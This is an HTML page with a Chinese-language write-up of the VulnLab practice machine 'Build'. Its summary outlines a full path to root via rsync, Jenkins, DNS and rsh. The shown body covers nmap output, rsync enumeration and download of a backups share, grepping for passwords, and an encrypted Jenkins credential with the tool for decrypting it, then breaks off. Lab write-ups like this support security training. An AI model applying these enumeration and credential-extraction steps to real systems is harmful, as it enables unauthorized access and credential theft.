@@ -1,0 +1,661 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+  <!-- bing -->
+  <meta name="msvalidate.01" content="D6E6F0AB3EAD6BA4F5541EDCB8EEDCC5" />
+
+  <!-- toc.js -->
+  <script src='/js/toc.js'> </script>
+  <script>
+  window.addEventListener('hexo-blog-decrypt', function(event) {
+    setTimeout(() => {
+      makeList({
+       'target': '#toc',   // Selector for element to place table of contents
+       'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+      });
+
+      makeList({
+       'target': '#toc-mobile',   // Selector for element to place table of contents
+       'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+      });
+    }, 1000);
+  });  
+  </script>
+  
+  <!-- mane defined -->
+  <script>
+    function scriptOnError(errorMsg){
+      try{ document.body.innerHTML = ""; }catch{}
+      document.write("<h1>Error: Loading script error. </h1>");
+      document.write("<p>Some script loading error, Please Disable AD Block and retry again.</p>");
+      document.write("<p>很抱歉，有些脚本似乎無法正常加載，請嘗試關閉 AD Block 再試一次。</p>");
+      document.write("<p>Error on loading: ");
+      document.write(errorMsg);
+      document.write("</p>");
+
+      window.stop ? window.stop() : document.execCommand("Stop");
+    }
+  </script>
+
+  <!-- GTM -->
+  <script>
+    if ((window.location.hostname != "localhost" ) && (window.location.hostname != "manesec.github.io") ){
+        (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+          new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+          j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+          'https://www.googletagmanager.com/gtm.js?id='+i+dl;
+          f.parentNode.insertBefore(j,f);
+          })(window,document,'script','dataLayer','GTM-T952MB6B');
+    }
+  </script>
+
+  <!-- clarity -->
+  <script type="text/javascript">
+      (function(c,l,a,r,i,t,y){
+          c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+          t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+          y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+      })(window, document, "clarity", "script", "ph6eztilds");
+  </script>
+
+  <!-- check baseurl -->
+  <script>
+    setInterval( ()=>{
+      if ((window.location.hostname != "localhost" ) && (window.location.hostname != "manesec.github.io") ){
+          window.location.href = "https://manesec.github.io" + window.location.pathname;
+      }
+    }, 500);
+  </script>
+
+   <!-- fancybox support -->
+   
+     
+<link rel="stylesheet" href="/js/fancybox/jquery.fancybox.min.css">
+
+   
+
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="​​ https:&#x2F;&#x2F;api.vulnlab.com&#x2F;api&#x2F;v1&#x2F;share?id&#x3D;4b25f275-07c8-41fa-8357-6f29508f2057 首先使用了 nmap 掃描技術來發現目標系統上開放的端口，包括 512 (Rexec)、513 (Rlogin)、514 (Rsh) 和 873 (Rsync)，以及運行在 3000 端口上的 Gitea 應用。這些端口的開放表明該系統可能">
+<meta property="og:type" content="article">
+<meta property="og:title" content="VulnLab - Machine - Build">
+<meta property="og:url" content="https://manesec.github.io/2025/01/01/2025/02-vulnlab-build/index.html">
+<meta property="og:site_name" content="Mane">
+<meta property="og:description" content="​​ https:&#x2F;&#x2F;api.vulnlab.com&#x2F;api&#x2F;v1&#x2F;share?id&#x3D;4b25f275-07c8-41fa-8357-6f29508f2057 首先使用了 nmap 掃描技術來發現目標系統上開放的端口，包括 512 (Rexec)、513 (Rlogin)、514 (Rsh) 和 873 (Rsync)，以及運行在 3000 端口上的 Gitea 應用。這些端口的開放表明該系統可能">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/02-vulnlab-Build/image-20241230005231-7jb2fgh.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/02-vulnlab-Build/image-20241228235612-unbhcd1.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/02-vulnlab-Build/image-20241228235621-qiww9wg.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/02-vulnlab-Build/image-20241229025636-bdmqnvw.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/02-vulnlab-Build/image-20241229025707-vb3a8lx.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/02-vulnlab-Build/image-20241229080713-xe14kka.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/02-vulnlab-Build/image-20241229080755-l33l4dj.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/02-vulnlab-Build/image-20241229080825-jw8c7nj.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/02-vulnlab-Build/image-20241229080903-x3dont4.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/02-vulnlab-Build/image-20241231041412-wn8v7og.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/02-vulnlab-Build/image-20241231041454-n0dqau0.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/02-vulnlab-Build/image-20241231041522-cyxkbjx.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/02-vulnlab-Build/image-20241231041623-auult6g.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/02-vulnlab-Build/image-20241229081246-9mvedri.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/02-vulnlab-Build/image-20241228231920-12trs7s.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/02-vulnlab-Build/image-20241228231928-ma8ercv.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/02-vulnlab-Build/image-20241228231941-1ax0zro.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/02-vulnlab-Build/image-20241229081928-5iqi4xi.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/02-vulnlab-Build/image-20241228231950-kvqts7m.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/02-vulnlab-Build/image-20241229081347-wqp0ctz.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/02-vulnlab-Build/image-20241229081317-z4vari0.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/02-vulnlab-Build/image-20241229082702-3i15435.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/02-vulnlab-Build/image-20241229082816-1f9hrlv.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/02-vulnlab-Build/image-20241229082845-yzyowyu.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/02-vulnlab-Build/image-20241230004923-z9yve9n.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/02-vulnlab-Build/image-20241229233410-ay50vpf.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/02-vulnlab-Build/image-20241229234022-xwp3o4s.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/02-vulnlab-Build/image-20241229234325-okfgz1t.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/02-vulnlab-Build/image-20241230003220-29ffqnw.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/02-vulnlab-Build/image-20241230003255-2kitr1q.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/02-vulnlab-Build/image-20241229234436-3kweuva.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/02-vulnlab-Build/image-20241230003621-pjq69yz.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/02-vulnlab-Build/image-20241230003634-1iufstp.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/02-vulnlab-Build/image-20241230003701-bxjy78s.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/02-vulnlab-Build/image-20241230003859-nsvz3j4.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/02-vulnlab-Build/image-20241230003920-1dp0zee.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/02-vulnlab-Build/image-20241230003932-w4dcmqc.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/02-vulnlab-Build/image-20241230003943-6f9c9h1.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/02-vulnlab-Build/image-20241230004025-2xq0j23.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/02-vulnlab-Build/image-20241230005039-n3fr21i.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/02-vulnlab-Build/image-20241230005142-k6dgn82.png">
+<meta property="article:published_time" content="2024-12-31T19:10:00.000Z">
+<meta property="article:modified_time" content="2024-12-31T19:15:08.482Z">
+<meta property="article:author" content="manesec">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://relay-img.manesec.com/maneblog/2025/02-vulnlab-Build/image-20241230005231-7jb2fgh.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>VulnLab - Machine - Build</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+<!-- Google Tag Manager (noscript) -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-T952MB6B"
+height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- End Google Tag Manager (noscript) -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-8C677QTBX9"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-8C677QTBX9');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2025/01/01/2025/03-vulnlab-data/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/12/30/2024/1230-htb-fullhouse/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://manesec.github.io/2025/01/01/2025/02-vulnlab-build/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://manesec.github.io/2025/01/01/2025/02-vulnlab-build/&text=VulnLab - Machine - Build"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://manesec.github.io/2025/01/01/2025/02-vulnlab-build/&title=VulnLab - Machine - Build"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://manesec.github.io/2025/01/01/2025/02-vulnlab-build/&is_video=false&description=VulnLab - Machine - Build"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=VulnLab - Machine - Build&body=Check out this article: https://manesec.github.io/2025/01/01/2025/02-vulnlab-build/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://manesec.github.io/2025/01/01/2025/02-vulnlab-build/&title=VulnLab - Machine - Build"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://manesec.github.io/2025/01/01/2025/02-vulnlab-build/&title=VulnLab - Machine - Build"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://manesec.github.io/2025/01/01/2025/02-vulnlab-build/&title=VulnLab - Machine - Build"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://manesec.github.io/2025/01/01/2025/02-vulnlab-build/&title=VulnLab - Machine - Build"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://manesec.github.io/2025/01/01/2025/02-vulnlab-build/&name=VulnLab - Machine - Build&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://manesec.github.io/2025/01/01/2025/02-vulnlab-build/&t=VulnLab - Machine - Build"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc"></div>
+    <style>
+    	#toc {
+	}
+    	#toc ul {
+	   display: grid ! important;
+	}
+    	#toc li {
+	   margin: 0 0 0 0 ! important;  
+	}
+	#toc .level-1 {
+	   font-size: 0.8rem;
+	   color: #ffffff ;
+	   background: #2bbc8ae5;
+	   padding-left: 3px;
+           padding-right: 3px;
+	}
+
+
+	#toc .level-1:hover {
+	   background: #00b4ddc7;
+	   color: #ffffff !important;
+	}
+
+	#toc .level-2 {
+	   font-size: 0.8rem;
+	   color: #2bbc8a;
+	}
+	#toc .level-3 {
+	   font-size: 0.7rem;
+	   color: #40474b;
+	}
+	#toc .level-4 , #toc .level-5, #toc .level-6 {
+	   font-size: 0.6rem;
+	   color: #8c8c8c;
+	}
+    </style>
+    
+    
+      <script>
+      	setTimeout(() => {
+	  makeList({
+	     'target': '#toc',   // Selector for element to place table of contents
+	     'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+	  });
+	}, 1000);
+      </script>
+     
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        VulnLab - Machine - Build
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">manesec</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-12-31T19:10:00.000Z" class="dt-published" itemprop="datePublished">2025-01-01</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>​<img src="https://relay-img.manesec.com/maneblog/2025/02-vulnlab-Build/image-20241230005231-7jb2fgh.png" alt="image">​</p>
+<p><a target="_blank" rel="noopener" href="https://api.vulnlab.com/api/v1/share?id=4b25f275-07c8-41fa-8357-6f29508f2057">https://api.vulnlab.com/api/v1/share?id=4b25f275-07c8-41fa-8357-6f29508f2057</a></p>
+<p>首先使用了 nmap 掃描技術來發現目標系統上開放的端口，包括 512 (Rexec)、513 (Rlogin)、514 (Rsh) 和 873 (Rsync)，以及運行在 3000 端口上的 Gitea 應用。這些端口的開放表明該系統可能允許無密碼的遠程訪問，但需要綁定 DNS 域名。接著，通過 Rsync 枚舉發現了一個名為 backups 的文件夾並下載其內容，其中搜索到可能包含密碼的文件，但部分文件如 jar 和 js 文件被排除在外。隨後，發現了一個 hash 和一個用戶名，嘗試破解 hash 未果，轉而關注另一個文件中可能的加密密碼。利用工具 pwn_jenkins 並參考官方文檔，解密了加密的密碼，但未能成功登錄 SSH。此時，注意到 Gitea 應用中存在一個 buildadm 用戶及其相關項目，通過修改 Jenkins 構建項目腳本獲得了一個 shell。在用戶目錄中發現 .rhosts 文件，顯示兩個允許無密碼 Rsh 登錄的域名，進一步調查發現可通過 DNS 修改來利用這一點。使用 ligolo 建立 tunnel，掃描內部網絡以訪問 DNS 修改界面，並成功在 powerdnsadmin 數據庫中查找用戶信息，破解並獲得 admin 密碼。最後，通過修改 DNS 設置，成功利用 Rsh 無密碼登錄獲得 root 權限。</p>
+<h1 id="Nmap-scan"><a href="#Nmap-scan" class="headerlink" title="Nmap scan"></a>Nmap scan</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">PORT     STATE    SERVICE         REASON         VERSION</span><br><span class="line">22/tcp   open     ssh             syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   256 47:21:73:e2:6b:96:<span class="built_in">cd</span>:f9:13:11:af:40:c8:4d:d6:7f (ECDSA)</span><br><span class="line">| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEwDujdYYBlK34trPdE896KV0Q89NkU0P+PNYKboWAXcOIzRxia7eKQnOZMDcbpjdpUgTlee4VpIiQwwKLfGLqg=</span><br><span class="line">|   256 2b:5e:ba:f3:72:d3:b3:09:<span class="built_in">df</span>:25:41:29:09:f4:7b:f5 (ED25519)</span><br><span class="line">|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAhXu4iRkeWtuE4+/w9QwJeecIUqhFrfTiQsmNatD9LG</span><br><span class="line">53/tcp   open     domain          syn-ack ttl 62 PowerDNS</span><br><span class="line">| dns-nsid:</span><br><span class="line">|   NSID: pdns (70646e73)</span><br><span class="line">|_  id.server: pdns</span><br><span class="line">512/tcp  open     <span class="built_in">exec</span>            syn-ack ttl 63 netkit-rsh rexecd</span><br><span class="line">513/tcp  open     login?          syn-ack ttl 63</span><br><span class="line">514/tcp  open     shell           syn-ack ttl 63 Netkit rshd</span><br><span class="line">873/tcp  open     rsync           syn-ack ttl 63 (protocol version 31)</span><br><span class="line">3000/tcp open     ppp?            syn-ack ttl 62</span><br><span class="line">| fingerprint-strings:</span><br><span class="line">|   GenericLines, Help, RTSPRequest:</span><br><span class="line">|     HTTP/1.1 400 Bad Request</span><br><span class="line">|     Content-Type: text/plain; charset=utf-8</span><br><span class="line">|     Connection: close</span><br><span class="line">|     Request</span><br><span class="line">|   GetRequest:</span><br><span class="line">|     HTTP/1.0 200 OK</span><br><span class="line">|     Cache-Control: max-age=0, private, must-revalidate, no-transform</span><br><span class="line">|     Content-Type: text/html; charset=utf-8</span><br><span class="line">|     Set-Cookie: i_like_gitea=4bd5112ba306805a; Path=/; HttpOnly; SameSite=Lax</span><br><span class="line">|     Set-Cookie: _csrf=QeutQUzzijt17AYo3Rr_1DwTJTk6MTczNTM5NjgzOTc1MzI2MzM2OA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax</span><br><span class="line">|     X-Frame-Options: SAMEORIGIN</span><br><span class="line">|     Date: Sat, 28 Dec 2024 14:40:39 GMT</span><br><span class="line">|     &lt;!DOCTYPE html&gt;</span><br><span class="line">|     &lt;html lang=<span class="string">&quot;en-US&quot;</span> class=<span class="string">&quot;theme-auto&quot;</span>&gt;</span><br><span class="line">|     &lt;<span class="built_in">head</span>&gt;</span><br><span class="line">|     &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1&quot;</span>&gt;</span><br><span class="line">|     &lt;title&gt;Gitea: Git with a cup of tea&lt;/title&gt;</span><br><span class="line">|     &lt;<span class="built_in">link</span> rel=<span class="string">&quot;manifest&quot;</span> href=<span class="string">&quot;data:application/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlYSIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRfdXJsIjoiaHR0cDovL2J1aWxkLnZsOjMwMDAvIiwiaWNvbnMiOlt7InNyYyI6Imh0dHA6Ly9idWlsZC52bDozMDAwL2Fzc2V0cy9pbWcvbG9nby5wbmciLCJ0eXBlIjoiaW1hZ2UvcG5nIiwic2l6ZXMiOiI1MTJ</span></span><br><span class="line"><span class="string">|   HTTPOptions:</span></span><br><span class="line"><span class="string">|     HTTP/1.0 405 Method Not Allowed</span></span><br><span class="line"><span class="string">|     Allow: HEAD</span></span><br><span class="line"><span class="string">|     Allow: GET</span></span><br><span class="line"><span class="string">|     Cache-Control: max-age=0, private, must-revalidate, no-transform</span></span><br><span class="line"><span class="string">|     Set-Cookie: i_like_gitea=52b607288d059e68; Path=/; HttpOnly; SameSite=Lax</span></span><br><span class="line"><span class="string">|     Set-Cookie: _csrf=vDDqpjXCrISkkhdmGz2FACdNdGM6MTczNTM5Njg0NTg0NDAwMDQwMA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax</span></span><br><span class="line"><span class="string">|     X-Frame-Options: SAMEORIGIN</span></span><br><span class="line"><span class="string">|     Date: Sat, 28 Dec 2024 14:40:45 GMT</span></span><br><span class="line"><span class="string">|_    Content-Length: 0</span></span><br><span class="line"><span class="string">3306/tcp filtered mysql           no-response</span></span><br><span class="line"><span class="string">8081/tcp filtered blackice-icecap no-response</span></span><br></pre></td></tr></table></figure>
+
+<p>從nmap的結果中可以看到開了 <code>512 (Rexec)</code>​，<code>513 (Rlogin)</code>​ 和 <code>514 (Rsh)</code>​ ，這三個都是用與遠程訪問而且可以免密碼，但是需要綁定 dns 域名。</p>
+<p>另外注意到 <code>873 (Rsync)</code>​ 也開啓了，還有一個 gitea 在 3000 端口。</p>
+<h1 id="Enumerate-Rsync-share-folder"><a href="#Enumerate-Rsync-share-folder" class="headerlink" title="Enumerate Rsync share folder"></a>Enumerate Rsync share folder</h1><p>既然開啓了 Rsync 那就可以根據 <a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/network-services-pentesting/873-pentesting-rsync">Hacktricks </a>上的提示嘗試枚舉一下：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/02-vulnlab-Build/image-20241228235612-unbhcd1.png" alt="image">​</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ rsync --list-only rsync://10.10.122.176/ </span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/02-vulnlab-Build/image-20241228235621-qiww9wg.png" alt="image">​</p>
+<p>可以看到有一個文件夾 <code>backups</code>​ 列擧了出來，所以嘗試下載裏面的内容：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">mkdir</span> rsync</span><br><span class="line">$ rsync -av rsync://10.10.122.176/backups ./rsync</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/02-vulnlab-Build/image-20241229025636-bdmqnvw.png" alt="image">​</p>
+<p>等了幾個小時才下載完成，解壓後得到：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/02-vulnlab-Build/image-20241229025707-vb3a8lx.png" alt="image">​</p>
+<p>由於裏面有大量的文件，所以嘗試搜索一下密碼的關鍵字：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ grep <span class="string">&quot;password&quot;</span> -ril</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/02-vulnlab-Build/image-20241229080713-xe14kka.png" alt="image">​</p>
+<p>結果有很多結果，其中裏面有大量的文件是不需要的，比如  <code>jar</code>​ 和 <code>js</code>​ 文件，裏面應該不會藏有密碼，一般的都是一些配置文件之類的。嘗試使用 grep 過濾掉后看到：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ grep <span class="string">&quot;password&quot;</span> -ril  | grep -v -E <span class="string">&quot;(jar|js)&quot;</span> </span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/02-vulnlab-Build/image-20241229080755-l33l4dj.png" alt="image">​</p>
+<p>其中第一個文件和第二個文件非常吸引我，再打開第一個文件之後看到有一個hash，跑了5分鐘也沒辦法破解。</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/02-vulnlab-Build/image-20241229080825-jw8c7nj.png" alt="image">​</p>
+<p>不過得到了一個用戶名：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin@build.vl</span><br></pre></td></tr></table></figure>
+
+<p>接下來就是看一下第二個文件：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cat</span> <span class="built_in">jobs</span>/build/config.xml</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/02-vulnlab-Build/image-20241229080903-x3dont4.png" alt="image">​</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;username&gt;buildadm&lt;/username&gt;                                                         </span><br><span class="line">&lt;password&gt;&#123;AQAAABAAAAAQUNBJaKiUQNaRbPI0/VMwB1cmhU/EHt0chpFEMRLZ9v0=&#125;&lt;/password&gt;</span><br></pre></td></tr></table></figure>
+
+<p>看起來不像是hash，而是把密碼加密後的東西。也就是說有機會可以還原出來。</p>
+<p>找了一段時間後發現了這個工具：<a target="_blank" rel="noopener" href="https://github.com/gquere/pwn_jenkins">https://github.com/gquere/pwn_jenkins</a></p>
+<p>從官方的文檔中可以看出來他需要三個文件：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/02-vulnlab-Build/image-20241231041412-wn8v7og.png" alt="image">​</p>
+<p>第一個是 <code>master.key</code>​ ，第二個是 <code>hudson.util.Secret</code>​，由於不知道路徑，所以去查一下，看到：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/02-vulnlab-Build/image-20241231041454-n0dqau0.png" alt="image">​</p>
+<p>官方文檔：<a target="_blank" rel="noopener" href="https://www.jenkins.io/doc/developer/security/secrets/">https://www.jenkins.io/doc/developer/security/secrets/</a></p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/02-vulnlab-Build/image-20241231041522-cyxkbjx.png" alt="image">​</p>
+<p>這兩個位置都存在於 <code>$JENKINS_HOME/secrets/</code>​ 裏面，對應的就是：</p>
